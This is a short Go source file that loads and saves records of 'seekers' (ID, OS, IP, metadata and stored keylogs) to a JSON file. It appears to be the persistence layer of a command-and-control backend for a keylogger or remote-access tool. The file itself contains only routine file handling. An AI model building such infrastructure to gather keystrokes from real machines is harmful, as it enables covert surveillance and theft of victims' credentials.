package handlers

import (
	"argus/backend/models"
	"encoding/json"
	"log"
	"os"
	"time"
)

const seekerFile = "seekers.json"

func LoadSeekersFromFile() {
	file, err := os.Open(seekerFile)
	if err != nil {
		if os.IsNotExist(err) {
			log.Println("No saved seekers to load.")
			return
		}
		log.Printf("Error opening seeker file: %v\n", err)
		return
	}
	defer file.Close()

	var savedSeekers []*models.Seeker
	if err := json.NewDecoder(file).Decode(&savedSeekers); err != nil {
		log.Printf("Error decoding seekers: %v\n", err)
		return
	}

	seekersLock.Lock()
	defer seekersLock.Unlock()
	for _, seeker := range savedSeekers {
		seeker.Disconnected = true
		seeker.Conn = nil
		seekers[seeker.ID] = seeker
	}
	log.Printf("Loaded %d seekers from file\n", len(savedSeekers))
}

func SaveSeekersToFile() {
	seekersLock.RLock()
	defer seekersLock.RUnlock()

	var toSave []*models.Seeker
	for _, seeker := range seekers {
		toSave = append(toSave, &models.Seeker{
			ID:           seeker.ID,
			Name:         seeker.Name,
			OS:           seeker.OS,
			IP:           seeker.IP,
			LastActive:   time.Now(),
			Disconnected: true,
			Keylogs:      seeker.Keylogs,
			Metadata:     seeker.Metadata,
			Conn:         nil,
		})
	}

	file, err := os.Create(seekerFile)
	if err != nil {
		log.Printf("Error saving seekers: %v\n", err)
		return
	}
	defer file.Close()

	if err := json.NewEncoder(file).Encode(toSave); err != nil {
		log.Printf("Error encoding seekers: %v\n", err)
	}
	log.Printf("Saved %d seekers to file\n", len(toSave))
}
